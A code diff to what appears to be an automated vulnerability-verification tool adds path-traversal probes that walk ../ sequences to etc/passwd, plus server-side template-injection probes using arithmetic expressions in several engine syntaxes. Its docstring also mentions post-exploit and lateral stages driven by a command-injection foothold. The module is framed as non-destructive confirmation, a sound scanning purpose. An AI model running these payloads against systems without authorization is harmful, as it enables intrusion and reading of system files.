@@ -12,9 +12,23 @@ alone, but by an observable oracle in the response:
   risk DoS / writes); this is read-only boolean logic only.
 * **OpenRedirect** — a benign external marker placed in a redirect parameter
   comes back in the ``Location`` header, so the endpoint redirects off-site.
+* **CommandInjection** — an injected shell *arithmetic* oracle is evaluated by
+  the target, proving execution without any destructive payload.
+* **PathTraversal** — a bounded ``../`` sequence reaches a well-known, benign,
+  read-only system file whose fixed public signature appears in the response.
+  The oracle is only "a known benign public file is reachable via ``../``"; no
+  sensitive content is parsed or exfiltrated.
+* **SSTI** — an injected template expression computing a product of two
+  distinctive constants is *evaluated* server-side (an arithmetic-reflection
+  oracle exactly like CommandInjection), so a literal reflection of the payload
+  is never mistaken for execution.
 
 Payloads are proof markers, never destructive. The goal is a confirmed finding,
-not damage: no data is modified, no query is stacked, nothing is deleted.
+not damage: no data is modified, no query is stacked, nothing is deleted. The
+traversal and SSTI techniques are stage-1 ONLY — they confirm a weakness with a
+benign observable oracle and stop; they never write, delete, escalate, persist,
+or set any context that drives the post-exploit / lateral stages (only a
+sequence-capable command-injection foothold does that).
 """
 
 from __future__ import annotations
@@ -219,6 +233,105 @@ class CommandInjection(Technique):
         return VerifyResult(False, self.name, self.cwe, "", ev, requests=requests)
 
 
+class PathTraversal(Technique):
+    name = "traversal"
+    cwe = "CWE-22"
+    applies_cwes = ("CWE-22", "CWE-23", "CWE-36")
+    applies_keywords = ("path traversal", "directory traversal", "traversal",
+                        "lfi", "local file")
+
+    # Benign, universally-present, read-only target. The oracle is a FIXED,
+    # non-secret public signature — the standard super-user account line that
+    # every POSIX ``/etc/passwd`` carries. We match only this content-free
+    # signature; we never parse or report the file's contents (no exfiltration).
+    _TARGET_FILE = "etc/passwd"
+    _SIGNATURE = "root:x:0:0:"
+    # Tiny, bounded probe set: a handful of traversal depths. Stops at the
+    # first depth that reaches the file.
+    _TRAVERSALS = (
+        "../" * 1, "../" * 2, "../" * 3, "../" * 4, "../" * 6, "../" * 8,
+    )
+
+    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
+        ev = [f"param {param!r} probed with a bounded ../ traversal to a "
+              f"benign read-only system file"]
+        requests = 0
+        for trav in self._TRAVERSALS:
+            payload = trav + self._TARGET_FILE
+            resp = transport.send("GET", url, {param: payload})
+            requests += 1
+            # Oracle: the fixed public signature is present only if the server
+            # actually read the file via our traversal. We do NOT echo any
+            # response content into evidence (benign signature match only).
+            if resp.ok and self._SIGNATURE in (resp.body or ""):
+                depth = trav.count("../")
+                proof = (f"path traversal confirmed on {param!r}: a benign "
+                         f"read-only system file is reachable via ../")
+                ev.append(f"benign signature {self._SIGNATURE!r} reached at "
+                          f"depth {depth} (status {resp.status})")
+                return VerifyResult(
+                    True, self.name, self.cwe, proof, ev, requests=requests,
+                    context={"param": param, "depth": depth,
+                             "target_file": self._TARGET_FILE})
+        ev.append("benign signature not reachable via ../ (no traversal)")
+        return VerifyResult(False, self.name, self.cwe, "", ev,
+                            requests=requests)
+
+
+# Server-side template-injection syntaxes to try (tiny, bounded set covering the
+# common engines). ``EXPR`` is spliced with the arithmetic oracle.
+_SSTI_SYNTAXES = (
+    "{{EXPR}}",       # Jinja2 / Twig / Nunjucks
+    "${EXPR}",        # FreeMarker / JSP EL / Thymeleaf / Velocity
+    "#{EXPR}",        # Ruby/Spring EL variants
+    "<%= EXPR %>",    # ERB
+    "{EXPR}",         # bare brace engines
+)
+
+
+class SSTI(Technique):
+    name = "ssti"
+    cwe = "CWE-1336"
+    applies_cwes = ("CWE-1336", "CWE-94")
+    applies_keywords = ("template inject", "ssti", "server-side template")
+
+    # Reflection-immune oracle, exactly like CommandInjection: a MARKER token is
+    # joined to a PRODUCT of two distinctive constants that the template engine
+    # must compute. A server that merely reflects our payload shows the literal
+    # expression (e.g. `{{7919*6421}}`); only actual evaluation yields the
+    # product, so `token-<product>` appears only on real server-side execution.
+    _A, _B = 7919, 6421
+
+    def run(self, transport: Transport, url: str, param: str) -> VerifyResult:
+        ev = [f"param {param!r} probed with a server-side template arithmetic "
+              f"oracle"]
+        token = f"{MARKER}ssti"
+        expr = f"{self._A}*{self._B}"
+        expect = f"{token}-{self._A * self._B}"   # e.g. aeg1s7k9zssti-50847899
+        requests = 0
+        for syntax in _SSTI_SYNTAXES:
+            # token prefix is OUTSIDE the template braces; the product is INSIDE.
+            inj = f"{token}-" + syntax.replace("EXPR", expr)
+            resp = transport.send("GET", url, {param: inj})
+            requests += 1
+            if resp.ok and expect in (resp.body or ""):
+                # the product appears joined to our token → the template engine
+                # evaluated our expression; a reflected literal `{{A*B}}` (or
+                # `${A*B}`, …) would show the operands, never the product.
+                proof = (f"server-side template injection confirmed on "
+                         f"{param!r}: injected template arithmetic was "
+                         f"evaluated (syntax {syntax!r})")
+                ev.append(f"computed oracle {expect!r} observed (syntax "
+                          f"{syntax!r})")
+                return VerifyResult(
+                    True, self.name, self.cwe, proof, ev, requests=requests,
+                    context={"param": param, "syntax": syntax})
+        ev.append("no evaluated-template output observed (literal reflection "
+                  "does not confirm)")
+        return VerifyResult(False, self.name, self.cwe, "", ev,
+                            requests=requests)
+
+
 def _similar(a: str, b: str) -> bool:
     """Cheap response-similarity oracle for boolean SQLi.
 
@@ -233,7 +346,8 @@ def _similar(a: str, b: str) -> bool:
     return abs(la - lb) <= max(64, int(0.05 * hi))
 
 
-ALL_TECHNIQUES = (ReflectedXSS(), BooleanSQLi(), OpenRedirect(), CommandInjection())
+ALL_TECHNIQUES = (ReflectedXSS(), BooleanSQLi(), OpenRedirect(),
+                  CommandInjection(), PathTraversal(), SSTI())
 
 
 def technique_for(finding_kind: str) -> Optional[Technique]:
@@ -244,5 +358,6 @@ def technique_for(finding_kind: str) -> Optional[Technique]:
 
 
 __all__ = ["MARKER", "Probe", "VerifyResult", "Technique", "ReflectedXSS",
-           "BooleanSQLi", "OpenRedirect", "CommandInjection", "_CMDI_TEMPLATES",
-           "ALL_TECHNIQUES", "technique_for"]
+           "BooleanSQLi", "OpenRedirect", "CommandInjection", "PathTraversal",
+           "SSTI", "_CMDI_TEMPLATES", "_SSTI_SYNTAXES", "ALL_TECHNIQUES",
+           "technique_for"]
